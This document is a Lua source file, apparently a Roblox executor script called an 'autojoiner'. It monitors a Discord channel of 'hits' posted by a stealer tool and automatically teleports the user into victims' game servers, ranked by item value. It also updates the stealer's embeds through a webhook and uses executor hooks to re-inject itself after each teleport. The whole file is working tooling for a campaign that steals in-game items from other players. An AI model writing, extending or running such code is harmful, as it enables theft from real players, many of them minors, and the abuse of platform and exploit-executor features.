-- ═══════════════════════════════════════════════════════════════════════
-- MESSAGE PARSER
-- Handles: (A) embed URL fern.wtf/joiner?placeId=X&gameInstanceId=Y
--          (B) content TeleportToPlaceInstance(X, "Y")
-- ═══════════════════════════════════════════════════════════════════════
local MAX_HIT_AGE = 20 * 60  -- skip hits older than 20 minutes

-- "almost claimed" is a LIVE state — the frontier pattern for "claimed" matches
-- the word inside it, so every near-miss hit was being thrown away. Strip those
-- phrases before testing.
local LIVE_PHRASES = { "almost claimed", "not claimed", "un claimed", "unclaimed" }
local function statusIsDead(fv)
    for _, p in ipairs(LIVE_PHRASES) do fv = fv:gsub(p, "") end
    if fv:find("left after") then return true end
    return fv:find("%f[%a]claimed%f[%A]") ~= nil or fv:find("%f[%a]left%f[%A]") ~= nil
end

local function isDeadEmbed(embed)
    if not embed then return false end
    local title = (embed.title or ""):lower()
    if title:find("left after", 1, true) then return true end
    for _, f in ipairs(embed.fields or {}) do
        local fv = (f.value or ""):lower()
        -- transferer status field: value = "# Status\n<emoji> <status>"
        local isStatusField = fv:find("# status", 1, true) ~= nil
                              or (f.name or ""):lower() == "status"
        if isStatusField and statusIsDead(fv) then return true end
    end
    return false
end

local function parseHit(msg)
    if tostring(msg.channel_id) ~= tostring(chanelid) then return nil end
    local msgId = tostring(msg.id)
    local placeId, jobId, value, playerName
    local embed = msg.embeds and msg.embeds[1]
    if embed then
        if isDeadEmbed(embed) then return nil end
        local vs = (embed.title or ""):match("([%d,]+) value")
        if vs then local s = vs:gsub(",",""); value = tonumber(s) end
        local url = embed.url or ""
        placeId    = url:match("placeId=(%d+)")
        jobId      = url:match("gameInstanceId=([^&%s]+)")
        playerName = (embed.author and embed.author.name) or "Unknown"
    end
    if (not placeId or not jobId) and msg.content then
        placeId, jobId = msg.content:match('TeleportToPlaceInstance%((%d+),%s*"([^"]+)"')
    end
    if not placeId or not jobId or jobId == "" then return nil end
    local placeNum = tonumber(placeId)
    if not placeNum then return nil end   -- a nil placeId reaches TeleportToPlaceInstance and hard-fails
    if visited[jobId] then return nil end
    local ts = snowflakeTs(msgId)
    if os.time() - ts > MAX_HIT_AGE then return nil end  -- too old, skip
    -- strip age suffix from author name: "Name  •  37d old" → "Name"
    local rawName = playerName or "Unknown"
    local cleanName = rawName:match("^(.-)%s+%•") or rawName
    return {
        msgId      = msgId,
        jobId      = jobId,
        placeId    = placeNum,
        value      = value or 0,
        playerName = cleanName,
        rawName    = rawName,
        timestamp  = ts,
    }
end

-- ═══════════════════════════════════════════════════════════════════════
-- QUEUE MANAGEMENT
-- ═══════════════════════════════════════════════════════════════════════
local function enqueue(hit)
    for _, h in ipairs(hitQueue) do
        if h.jobId == hit.jobId then return end
    end
    -- assign hit code and store in history for !join
    if not hit.code then hit.code = hit.jobId:sub(1, 6):upper() end
    local hist = getgenv()._aj_hitHistory
    hist[hit.code] = hit
    local keys = {}
    for k in pairs(hist) do table.insert(keys, k) end
    if #keys > 30 then
        table.sort(keys, function(a, b)
            return (hist[a] and hist[a].timestamp or 0) < (hist[b] and hist[b].timestamp or 0)
        end)
        for i = 1, #keys - 30 do hist[keys[i]] = nil end
    end
    table.insert(hitQueue, hit)
    table.sort(hitQueue, function(a, b) return a.value > b.value end)
end

local function dequeue()
    for i, h in ipairs(hitQueue) do
        if not visited[h.jobId] then
            table.remove(hitQueue, i)
            return h
        end
    end
    return nil
end

-- ═══════════════════════════════════════════════════════════════════════
-- EMBED PATCHER
-- Fetches the stealer's Discord message and updates the Status field.
-- Uses the webhook PATCH endpoint so no bot token scope is needed for write.
-- ═══════════════════════════════════════════════════════════════════════
local function patchHitStatus(hit, statusText)
    if not hit or not hit.msgId or not chanelid or chanelid == "" then return end
    if not webhookurl or webhookurl == "" then return end
    -- Fetch the current message to get the full embed (we must resend the whole thing)
    local msg = dJson({
        Url     = dchan("/messages/" .. hit.msgId),
        Method  = "GET",
        Headers = dhdr(),
    })
    if not msg or not msg.embeds or not msg.embeds[1] then return end
    local embed = msg.embeds[1]
    -- Two transferer formats: a field literally named "Status", and the newer
    -- one whose *value* begins with "# Status". The old code only matched the
    -- first, so on current embeds it PATCHed the message back unchanged.
    local patched = false
    for _, f in ipairs(embed.fields or {}) do
        local fname = (f.name or ""):lower()
        local fval  = (f.value or ""):lower()
        if fname == "status" then
            f.value = statusText; patched = true; break
        elseif fval:find("# status", 1, true) then
            f.value = "# Status\n" .. statusText; patched = true; break
        end
    end
    if not patched then
        embed.fields = embed.fields or {}
        table.insert(embed.fields, { name = "Status", value = statusText, inline = false })
    end
    dreq({
        Url     = webhookurl .. "/messages/" .. hit.msgId,
        Method  = "PATCH",
        Headers = { ["Content-Type"] = "application/json" },
        Body    = HttpService:JSONEncode({ embeds = { embed } }),
    }, 1)
end

-- ═══════════════════════════════════════════════════════════════════════
-- QUEUE-ON-TELEPORT  (best-effort — executor auto-rerun handles fallback)
-- If this succeeds, getgenv state is preserved across the hop.
-- If it fails, detectCurrentHit() recovers the target from Discord on restart.
-- ═══════════════════════════════════════════════════════════════════════
local function queueReexec()
    local qot
    for _, ns in ipairs({ _G, syn, fluxus, krnl, wave, electron, getgenv() }) do
        if type(ns) == "table" and type(ns.queue_on_teleport) == "function" then
            qot = ns.queue_on_teleport; break
        end
    end
    if not qot then
        local ok, v = pcall(function() return queue_on_teleport end)
        if ok and type(v) == "function" then qot = v end
    end
    if not qot then return end

    local src = getgenv()._aj_src or ""
    if src ~= "" then
        -- Best case: queue our full source
        pcall(qot, src)
    else
        -- Source unavailable — call queue_on_teleport with a placeholder.
        -- Many executors use the *call itself* as the signal to re-inject their
        -- last manually-run script, so this is enough to trigger auto-rerun.
        pcall(qot, "-- mm2_autojoiner requeue placeholder")
    end
end

-- ═══════════════════════════════════════════════════════════════════════
-- DETECT CURRENT HIT  (state recovery when getgenv resets after teleport)
-- Matches game.JobId against recent Discord embeds to find our target.
-- Called at startup before the seed scan so the victim doesn't get queued.
-- ═══════════════════════════════════════════════════════════════════════
local function detectCurrentHit()
    if not chanelid or chanelid == "" then return nil end
    local myJobId = tostring(game.JobId)
    if myJobId == "" then return nil end

    local msgs = recentMsgs()
    if not msgs then return nil end

    for _, m in ipairs(msgs) do
        if tostring(m.channel_id) ~= tostring(chanelid) then continue end
        local embed = m.embeds and m.embeds[1]
        if not embed then continue end
        if isDeadEmbed(embed) then continue end
        local url    = embed.url or ""
        local jobId  = url:match("gameInstanceId=([^&%s]+)")
        if jobId ~= myJobId then continue end
        -- Found the embed for THIS server
        local vs = (embed.title or ""):match("([%d,]+) value")
        local value = 0
        if vs then local s = vs:gsub(",",""); value = tonumber(s) or 0 end
        local rawName = (embed.author and embed.author.name) or "Unknown"
        local cleanName = rawName:match("^(.-)%s+%•") or rawName
        return {
            msgId      = tostring(m.id),
            jobId      = jobId,
            placeId    = tonumber(url:match("placeId=(%d+)")),
            value      = value,
            playerName = cleanName,
            rawName    = rawName,
            timestamp  = snowflakeTs(m.id),
        }
    end
    return nil
end

-- ═══════════════════════════════════════════════════════════════════════
-- LIVE-CHECK  (re-fetches the embed right before joining to confirm the
-- victim hasn't already left — guards against stale queue entries)
-- ═══════════════════════════════════════════════════════════════════════
local function isHitStillLive(hit)
    if not hit.msgId or not chanelid or chanelid == "" then return true end
    -- Try the shared 5s cache first: draining a queue of stale hits is now one
    -- HTTP round-trip total instead of one per hit.
    local msg
    local msgs = recentMsgs()
    if msgs then
        for _, m in ipairs(msgs) do
            if tostring(m.id) == tostring(hit.msgId) then msg = m; break end
        end
    end
    if not msg then
        msg = dJson({ Url = dchan("/messages/" .. hit.msgId), Method = "GET", Headers = dhdr() })
    end
    if not msg then return true end   -- unknown: assume live rather than skip a good hit
    local embed = msg.embeds and msg.embeds[1]
    if not embed then return true end
    return not isDeadEmbed(embed)     -- single source of truth for "dead"
end

-- ═══════════════════════════════════════════════════════════════════════
-- TELEPORT
-- ═══════════════════════════════════════════════════════════════════════
local _tpFailConn = nil

local function joinServer(hit)
    if not hit or not hit.placeId or not hit.jobId then
        warn("[AJ] joinServer called with an incomplete hit — ignoring")
        return
    end
    -- Hard guard: never teleport to the server we're already in
    if tostring(game.JobId) == hit.jobId then
        warn("[AJ] Already in " .. hit.playerName .. "'s server — skipping joinServer")
        visited[hit.jobId] = true
        return
    end
    getgenv()._aj_currentHit    = hit
    getgenv()._aj_inServerSince = os.time()
    getgenv()._aj_lastTradeTime = os.time()  -- 60s clock starts from join
    getgenv()._aj_done          = false
    getgenv()._aj_doneReason    = ""
    visited[hit.jobId] = true
    getgenv()._aj_sessionHits = (getgenv()._aj_sessionHits or 0) + 1
    -- Update embed to show autojoiner is on the way
    task.spawn(function() patchHitStatus(hit, "🟡 Autojoining...") end)

    -- Queue the script to re-execute in the new server after teleport.
    queueReexec()

    if logid and logid ~= "" then
        task.spawn(function()
            dreq({
                Url     = logid,
                Method  = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body    = HttpService:JSONEncode({
                    content = "Joining **" .. hit.playerName .. "** · " .. commaNum(hit.value) .. " value"
                })
            }, 1)
        end)
    end

    getgenv()._aj_teleporting = true

    -- TeleportInitFailed: retry up to 5 times before giving up.
    -- Drop the previous join's listener first — on a long session these stacked
    -- up and every one of them fired its own retry teleport.
    if _tpFailConn then pcall(function() _tpFailConn:Disconnect() end) end
    local _failConn
    local _failCount = 0
    local _failHit   = hit
    _failConn = TeleportService.TeleportInitFailed:Connect(function(player, reason)
        if player ~= LP then return end
        _failCount = _failCount + 1
        warn("[AJ] TeleportInitFailed: " .. tostring(reason) .. " (attempt " .. _failCount .. ")")
        if _failCount > 5 then
            warn("[AJ] Giving up after 5 failed teleport attempts")
            pcall(function() _failConn:Disconnect() end)
            getgenv()._aj_teleporting = false
            getgenv()._aj_currentHit  = nil
            return
        end
        -- Only retry if we're still targeting the same hit
        local ch = getgenv()._aj_currentHit
        if ch and ch.jobId == _failHit.jobId then
            task.delay(2, function()
                if getgenv()._aj_currentHit and getgenv()._aj_currentHit.jobId == _failHit.jobId then
                    pcall(function() TeleportService:TeleportToPlaceInstance(_failHit.placeId, _failHit.jobId, LP) end)
                end
            end)
        else
            pcall(function() _failConn:Disconnect() end)
        end
    end)
    _tpFailConn = _failConn
    -- Hard ceiling: if the teleport went through, this listener is dead weight.
    task.delay(45, function()
        if _tpFailConn == _failConn then
            pcall(function() _failConn:Disconnect() end)
            _tpFailConn = nil
        end
    end)

    pcall(function()
        TeleportService:TeleportToPlaceInstance(hit.placeId, hit.jobId, LP)
    end)
end

-- ═══════════════════════════════════════════════════════════════════════
-- LOG SYSTEM  (feeds both warn() and the Console tab in WindUI)
-- ═══════════════════════════════════════════════════════════════════════
local logSlots   = {}
local logEntries = {}
local LOG_MAX    = 12
local function logMsg(msg)
    local line = os.date("%H:%M:%S") .. "  " .. msg
    table.insert(logEntries, 1, line)
    if #logEntries > LOG_MAX then table.remove(logEntries) end
    warn("[AJ] " .. msg)
    for i, slot in ipairs(logSlots) do
        local entry = logEntries[i]
        pcall(function()
            if entry then slot:SetTitle(entry); slot:SetDesc("")
            else slot:SetTitle("—"); slot:SetDesc("") end
        end)
    end
end

-- ═══════════════════════════════════════════════════════════════════════
-- SERVER HOP  (self-contained — no external URL dependency)
-- ═══════════════════════════════════════════════════════════════════════
-- Is the victim in this server? The transferer's embed may carry a display name
-- rather than a username, so check both and ignore case.
local function victimPresent(name)
    if not name or name == "" then return false end
    local want = name:lower()
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower() == want then return true end
        local ok, dn = pcall(function() return p.DisplayName end)
        if ok and dn and dn:lower() == want then return true end
    end
    return false
end

local function doServerHop()
    local placeId     = game.PlaceId
    local curJob      = tostring(game.JobId)
    local maxSlots    = Players.MaxPlayers
    local cursor      = ""
    local tried       = 0
    local best, bestPlaying = nil, math.huge
    for _ = 1, 3 do
        local url = "https://games.roblox.com/v1/games/" .. placeId ..
            "/servers/Public?sortOrder=Asc&limit=100" .. (cursor ~= "" and ("&cursor=" .. cursor) or "")
        local ok, res = pcall(request, { Url = url, Method = "GET" })
        if not ok or not res or res.StatusCode ~= 200 then break end
        local data
        pcall(function() data = HttpService:JSONDecode(res.Body) end)
        if not data or not data.data then break end
        tried = tried + #data.data
        for _, srv in ipairs(data.data) do
            if tostring(srv.id) ~= curJob and (srv.playing or 0) < maxSlots and (srv.playing or 0) < bestPlaying then
                best, bestPlaying = srv, srv.playing or 0
            end
        end
        cursor = data.nextPageCursor or ""
        if cursor == "" then break end
    end
    if best then
        logMsg("ServerHop: joining server " .. bestPlaying .. "/" .. maxSlots .. " (checked " .. tried .. ")")
        pcall(function() TeleportService:TeleportToPlaceInstance(placeId, best.id, LP) end)
        return
    end
    logMsg("ServerHop: no open server found (" .. tried .. " checked) — matchmaker fallback")
    pcall(function() TeleportService:Teleport(placeId, LP) end)
end

